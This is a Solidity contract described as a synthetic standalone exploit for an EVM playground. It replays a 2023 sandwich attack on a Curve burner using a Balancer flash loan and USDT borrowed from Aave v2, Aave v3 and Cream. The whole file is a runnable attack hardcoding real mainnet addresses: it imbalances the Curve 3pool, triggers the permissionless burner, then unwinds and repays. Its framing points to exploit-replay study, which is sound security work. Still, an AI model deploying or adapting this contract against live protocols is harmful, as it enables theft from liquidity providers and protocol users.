// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../interface.sol";

// Synthetic standalone exploit for the EVM Playground (2023-08-CurveBurner).
// The registry PoC runs the attack inline in Foundry's ContractTest, with the
// Balancer flash-loan callback living on the test contract itself. This file
// removes Foundry-only cheatcodes/logging and preserves the on-chain call flow:
// Balancer flash loan -> borrow extra USDT from Aave v3, Aave v2, and Cream ->
// imbalance Curve 3pool -> call the permissionless Curve burner -> unwind.

interface ICurveBurner {
    function execute() external;
}

interface ICurve {
    function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external;
    function remove_liquidity_imbalance(uint256[3] memory amounts, uint256 max_burn_amount) external;
    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external;
}

contract CurveBurnerSandwich {
    ICurveBurner private constant CURVE_BURNER = ICurveBurner(0x786B374B5eef874279f4B7b4de16940e57301A58);
    IERC20 private constant WSTETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 private constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant LP = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    crETH private constant CETH = crETH(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5);
    ICurve private constant CURVE_3POOL = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICErc20Delegate private constant CUSDT = ICErc20Delegate(0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9);
    ICointroller private constant COMPTROLLER = ICointroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
    IBalancerVault private constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan private constant AAVE_V2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAaveFlashloan private constant AAVE_V3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    function run() external {
        address[] memory tokens = new address[](3);
        tokens[0] = address(WSTETH);
        tokens[1] = address(WETH);
        tokens[2] = address(USDT);

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 35_986 ether;
        amounts[1] = 79_768 ether;
        amounts[2] = 10_744_911 * 1e6;

        BALANCER.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        WSTETH.approve(address(AAVE_V3), WSTETH.balanceOf(address(this)));
        AAVE_V3.supply(address(WSTETH), WSTETH.balanceOf(address(this)), address(this), 0);
        AAVE_V3.borrow(address(USDT), 40_000_000 * 1e6, 2, 0, address(this));

        WETH.approve(address(AAVE_V2), WETH.balanceOf(address(this)));
        AAVE_V2.deposit(address(WETH), 50_000 ether, address(this), 0);
        AAVE_V2.borrow(address(USDT), 65_000_000 * 1e6, 2, 0, address(this));

        WETH.withdraw(29_000 ether);

        address[] memory cTokens = new address[](2);
        cTokens[0] = address(CETH);
        cTokens[1] = address(CUSDT);
        COMPTROLLER.enterMarkets(cTokens);
        CETH.mint{value: 29_000 ether}();
        CUSDT.borrow(40_000_000 * 1e6);

        LP.approve(address(CURVE_3POOL), type(uint256).max);
        USDC.approve(address(CURVE_3POOL), type(uint256).max);
        DAI.approve(address(CURVE_3POOL), type(uint256).max);
        TransferHelper.safeApprove(address(USDT), address(CURVE_3POOL), type(uint256).max);
        TransferHelper.safeApprove(address(USDT), address(CUSDT), type(uint256).max);
        TransferHelper.safeApprove(address(USDT), address(AAVE_V2), type(uint256).max);
        TransferHelper.safeApprove(address(USDT), address(AAVE_V3), type(uint256).max);

        uint256[3] memory amount;
        amount[0] = 0;
        amount[1] = 0;
        amount[2] = USDT.balanceOf(address(this));
        CURVE_3POOL.add_liquidity(amount, 1);

        amount[0] = DAI.balanceOf(address(CURVE_3POOL)) * 978 / 1000;
        amount[1] = USDC.balanceOf(address(CURVE_3POOL)) * 978 / 1000;
        amount[2] = 0;
        CURVE_3POOL.remove_liquidity_imbalance(amount, LP.balanceOf(address(this)));

        CURVE_BURNER.execute();

        amount[0] = DAI.balanceOf(address(this));
        amount[1] = USDC.balanceOf(address(this));
        amount[2] = 0;
        CURVE_3POOL.add_liquidity(amount, 1);

        CURVE_3POOL.remove_liquidity_one_coin(LP.balanceOf(address(this)), 2, 1);

        CUSDT.repayBorrow(CUSDT.borrowBalanceCurrent(address(this)));
        CETH.redeemUnderlying(29_000 ether);

        WETH.deposit{value: 29_000 ether}();
        AAVE_V2.repay(address(USDT), 65_000_000 * 1e6, 2, address(this));
        AAVE_V2.withdraw(address(WETH), 50_000 ether, address(this));

        AAVE_V3.repay(address(USDT), 40_000_000 * 1e6, 2, address(this));
        AAVE_V3.withdraw(address(WSTETH), type(uint256).max, address(this));

        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
        IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);
        TransferHelper.safeTransfer(tokens[2], msg.sender, amounts[2] + feeAmounts[2]);
    }

    receive() external payable {}
}
